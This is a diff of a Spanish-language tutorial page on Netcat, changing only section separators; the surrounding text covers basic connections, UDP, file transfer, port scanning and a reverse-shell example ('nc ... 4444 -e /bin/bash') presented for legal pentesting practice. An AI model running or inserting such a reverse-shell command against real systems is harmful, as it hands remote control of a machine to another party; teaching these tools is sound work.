@@ -4,7 +4,7 @@ description: Netcat - Notas de hacking y ciberseguridad.
 ---
 
 # Netcat en Linux
----
+***
 
 ## ¿Qué es Netcat?
 **Netcat** (abreviado nc) es una herramienta de línea de comandos usada para:
@@ -15,7 +15,7 @@ description: Netcat - Notas de hacking y ciberseguridad.
 
 Es conocida como el **“cuchillo suizo de las redes”**.
 
----
+***
 
 ## Instalación
 En la mayoría de sistemas viene preinstalado:
@@ -32,14 +32,14 @@ sudo apt install netcat
 
 **Windows:** Puedes usar **Ncat** (parte de Nmap): [https://nmap.org/ncat/](https://nmap.org/ncat/)
 
----
+***
 
 ## Sintaxis general
 ```bash
 nc [opciones] [host] [puerto]
 ```
 
----
+***
 
 ## Modos principales de uso
 ## Cliente TCP
@@ -67,7 +67,7 @@ nc 127.0.0.1 8080
 
 Ahora puedes **enviar mensajes entre ambos terminales (chat simple)**.
 
----
+***
 
 ## UDP en lugar de TCP
 Para usar **UDP** en vez de TCP:
@@ -81,7 +81,7 @@ nc -u 127.0.0.1 6000
 
 -u → activa modo UDP.
 
----
+***
 
 ## Transferencia de archivos
 ## Enviar un archivo
@@ -97,7 +97,7 @@ nc 127.0.0.1 5000 < archivo.txt
 
 El archivo archivo.txt se envía al servidor.
 
----
+***
 
 ## Chat simple entre dos PCs (TCP)
 En una máquina:
@@ -112,7 +112,7 @@ nc IP_DEL_SERVIDOR 4000
 
 Ahora ambos pueden escribir y leer mensajes.
 
----
+***
 
 ## Escaneo de puertos
 Netcat puede escanear qué puertos están abiertos en una máquina:
@@ -126,7 +126,7 @@ nc -zv 192.168.1.10 20-80
 
 20-80 → rango de puertos.
 
----
+***
 
 ## Redirección de entrada/salida
 Puedes usar **pipes** para automatizar tareas:
@@ -139,7 +139,7 @@ O guardar la respuesta:
 nc 127.0.0.1 80  respuesta.txt
 ```
 
----
+***
 
 ## Reverse Shells (usos éticos y educativos)
 Netcat puede crear conexiones remotas tipo **shell inversa**, usadas en **pentesting** (no ilegalmente).
@@ -156,12 +156,12 @@ nc 192.168.1.100 4444 -e /bin/bash
 
 Esto le da al servidor una consola remota de la otra máquina. *(Solo en entornos controlados o de práctica legal.)*
 
----
+***
 
 ## Otras opciones útiles
 <!-- Tabla convertida manualmente -->
 
----
+***
 
 ## Ejemplo práctico completo
 ## Crear servidor de eco
@@ -177,12 +177,12 @@ nc 127.0.0.1 1234
 
 Ahora cualquier texto que envíes se reflejará entre ambos.
 
----
+***
 
 ## Resumen rápido
 <!-- Tabla convertida manualmente -->
 
----
+***
 
 ## Alternativas modernas
 - **Ncat** (de Nmap): versión más segura y moderna.
